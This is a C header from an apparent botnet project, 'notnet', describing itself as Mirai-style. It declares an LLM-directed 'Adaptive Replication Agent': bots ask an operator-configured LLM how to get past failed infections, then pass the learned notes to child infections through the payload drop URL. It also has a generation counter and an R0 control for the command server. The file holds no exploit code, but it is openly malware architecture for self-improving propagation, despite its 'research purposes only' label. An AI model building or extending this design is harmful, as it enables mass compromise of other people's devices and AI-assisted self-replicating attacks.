/*
 * notnet - Modern Mirai-Style Botnet
 * ara.h - Adaptive Replication Agent header (#401)
 *
 * LLM-directed infection brain: the operator configures an LLM
 * endpoint, a model, an API key, and two prompt templates (system +
 * user). When a spread attempt fails on an unfamiliar target, the bot
 * asks the LLM how to adapt, persists the learned notes, and passes
 * them parent->daughter on the payload drop URL (Lamarckian
 * inheritance — the mechanism the Anthropic self-replicating-AI paper
 * measured lifting inference-setup success from 45% to 61-84% across
 * generations).
 *
 * Off by default (ara_enabled=0): no LLM calls, no notes file, no
 * drop-URL notes param — stock behavior unchanged.
 *
 * Research purposes only.
 */
#ifndef NOTNET_ARA_H
#define NOTNET_ARA_H

/* NOT included here on purpose: protocol.h includes ara.h for the
 * notnet_bot_t.ara field, so including it back would be circular.
 * ara.c pulls in protocol.h itself. The few prototypes that need
 * notnet_bot_t are declared with the type already visible at their
 * point of use in protocol.h consumers. */
#include <stdint.h>
#include <stddef.h>

/* ── Bounds ──────────────────────────────────────────────────── */
#define ARA_LLM_URL_MAX       256
#define ARA_LLM_MODEL_MAX     64
#define ARA_LLM_KEY_MAX       128
#define ARA_PROMPT_MAX        512
#define ARA_LLM_MAX_TOKENS    128    /* cap the advisor's answer */
#define ARA_LLM_BODY_MAX      2048
#define ARA_LLM_RESP_MAX      4096

/* Notes store bounds (shared: protocol.c sizes the drop-URL blob
 * buffer from these). */
#define ARA_NOTES_MAX_LINES   16
#define ARA_NOTE_MAX_LEN      192

/* ── LLM configuration (operator-set) ────────────────────────── */
/* All fields are set from /etc/notnet.conf (ara_* keys) or the
 * matching NOTNET_ARA_* env vars. enabled=0 (default) disables the
 * whole module: ara_adapt() refuses and no notes ride the drop URL. */
typedef struct {
    uint8_t enabled;                       /* ara_enabled= */
    char    url[ARA_LLM_URL_MAX];          /* ara_llm_url= http(s)://host[:port][/path] */
    char    model[ARA_LLM_MODEL_MAX];      /* ara_llm_model= */
    char    api_key[ARA_LLM_KEY_MAX];      /* ara_llm_key= */
    char    sys_prompt[ARA_PROMPT_MAX];    /* ara_llm_sysprompt= */
    char    user_prompt[ARA_PROMPT_MAX];   /* ara_llm_userprompt= (see placeholders below) */
} ara_llm_t;

/* User-prompt template placeholders (expanded by ara.c):
 *   {target}  target "ip:port"
 *   {arch}    arch_detect() label
 *   {notes}   inherited notes, one per line
 *   {error}   the failure that triggered the adapt call            */

/* ── Notes store (Lamarckian inheritance) ────────────────────── */
/* Bounded, newline-delimited "gen:note" file. Parent writes, child
 * reads at boot (ara_notes_absorb) — the daughter starts from its
 * parent's learned state instead of cold. DROP-OLDEST at capacity. */

/* Load notes from <dir>/ara-notes.conf (dir from ara_notes_dir=).
 * No file = cold parent, generation 0 (not an error). */
void ara_notes_load(const char *dir);

/* Absorb the parent's serialized notes blob (the drop-URL param).
 * Increments the generation. Returns the number of notes absorbed. */
int  ara_notes_absorb(const char *blob);

/* Current notes as one URL-safe blob ("gen1note1~gen2note2~...").
 * Empty (0) when there are no notes. Caller wraps in the drop URL. */
int  ara_notes_blob(char *buf, size_t len);

/* Multi-line render (status command) and compact one-line form
 * (heartbeat "ara" field: "gen=N notes=N r0=X adapted=0/1"). */
void ara_notes_render(char *buf, size_t len);
void ara_status_render(char *buf, size_t len);

int  ara_generation(void);
int  ara_note_count(void);

/* ── R0 knob ─────────────────────────────────────────────────── */
/* Fleet reproduction estimate (infections-quarantines)/infections
 * x100, operator-fed so the C2 can drive R0<1 and let the lineage die
 * out. Documented as an operator knob, not a real epidemic model. */
void ara_update_r0(int infections, int quarantines);
int  ara_r0_x100(void);

/* NOTE: ara_adapt() is declared in protocol.h, AFTER notnet_bot_t is
 * complete — it takes a bot pointer, which this header cannot name. */

#endif /* NOTNET_ARA_H */
